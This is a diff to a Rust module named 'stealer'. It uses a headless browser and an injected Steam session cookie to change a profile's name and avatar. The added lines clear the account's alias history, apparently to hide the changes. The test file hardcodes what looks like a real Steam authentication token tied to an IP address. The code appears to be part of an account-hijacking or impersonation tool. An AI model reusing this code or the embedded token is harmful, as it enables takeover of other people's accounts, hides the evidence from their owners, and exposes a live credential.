@@ -8,9 +8,10 @@ use chromiumoxide::{
     BrowserConfig,
     cdp::browser_protocol::network::CookieParam,
 };
-use crate::websocket::{SteamMessageOut, WebsocketWrapper};
 use futures::StreamExt;
 use reqwest::get;
+
+use crate::websocket::{SteamMessageOut, WebsocketWrapper};
 
 pub async fn image_to_base64(wrapper: &mut WebsocketWrapper, image_url: &str) -> Result<String> {
     wrapper.log("Requesting image from url").await;
@@ -101,7 +102,30 @@ pub async fn headless_steam(wrapper: &mut WebsocketWrapper, name: &str, base64_i
 
     wrapper.log("Finished updating image.").await;
 
-    let _ = page.wait_for_navigation().await?.content().await?;
+    let _ = page.wait_for_navigation().await?;
+
+    wrapper.log("Navigating to profile to clear aliases...").await;
+    page.goto(&wrapper.profile_url).await?;
+    let _ = page.wait_for_navigation_response().await?;
+
+    wrapper.log("Got to profile, opening dialog...").await;
+
+    page
+        .evaluate("ShowClearAliasDialog()")
+        .await
+        .context("Failed to run ShowClearAliasDialog() function")?;
+    wrapper.log("Ran ShowClearAliasDialog() function, clicking button").await;
+
+    let _ = page.wait_for_navigation_response().await?;
+
+    page.find_element(".btn_green_steamui")
+        .await?
+        .click()
+        .await?;
+
+    wrapper.log("Clicked clear aliases button.").await;
+    let _ = page.wait_for_navigation_response().await?;
+
     wrapper.log("Page finished navigation, closing browser.").await;
 
     browser.close().await?;
@@ -115,10 +139,11 @@ mod tests {
     use crate::profile::get_self_profile;
     use crate::stealer::{headless_steam, image_to_base64};
     use crate::websocket::WebsocketWrapper;
+
     const AUTH_COOKIE: &str = "76561198286609782%7C%7CeyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.eyAiaXNzIjogInI6MTFEMF8yMjMxODEzRl9DRkNDRCIsICJzdWIiOiAiNzY1NjExOTgyODY2MDk3ODIiLCAiYXVkIjogWyAid2ViIiBdLCAiZXhwIjogMTY4NDQzODUyNywgIm5iZiI6IDE2NzU3MTE2MjMsICJpYXQiOiAxNjg0MzUxNjIzLCAianRpIjogIjBEMUVfMjI4REE3MDhfQzAxQ0EiLCAib2F0IjogMTY3ODMwMTkwMywgInJ0X2V4cCI6IDE2OTYzOTQwOTksICJwZXIiOiAwLCAiaXBfc3ViamVjdCI6ICI3MS4xOTEuODQuMjgiLCAiaXBfY29uZmlybWVyIjogIjcxLjE5MS44NC4yOCIgfQ.95-Oc8Q02HRQKEv2z82CV7M2KZ-BHwGU4pxQzb17_qKffoxM67WTb0vqTgwgv6s8F9PQXDwvpNsE9AL0JkM8BA";
 
     #[tokio::test]
-    async fn test_image_shit() -> Result<()> {
+    async fn headless_steam_test() -> Result<()> {
         let mut wrapper = WebsocketWrapper::new(None);
         wrapper.cookie = AUTH_COOKIE.to_owned();
         wrapper.profile_url = "https://steamcommunity.com/id/coops_".to_owned();
